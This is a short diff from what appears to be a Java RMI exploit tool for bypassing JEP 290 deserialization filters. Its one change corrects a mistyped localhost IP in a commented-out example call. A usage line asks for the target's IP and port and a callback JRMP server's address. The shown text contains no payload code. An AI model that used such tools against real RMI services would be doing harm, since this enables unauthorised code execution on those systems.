@@ -74,7 +74,7 @@ public class BypassJEP290_Lookup  {
 	public static void main(String[] args) throws UnknownHostException {
 		System.out.println("4个参数：攻击目标ip 攻击目标port 回连JRMP服务器ip 回连JRMP服务器port");
 		//例子
-//		BypassJEP290_RMIConnectionImpl_Stub payload = new BypassJEP290_RMIConnectionImpl_Stub("127.0..0.1",1199);
+//		BypassJEP290_RMIConnectionImpl_Stub payload = new BypassJEP290_RMIConnectionImpl_Stub("127.0.0.1",1199);
 //		BypassJEP290_Lookup a= new BypassJEP290_Lookup();
 //		a.executeAttack_lala("127.0.0.1",1099,payload);
 
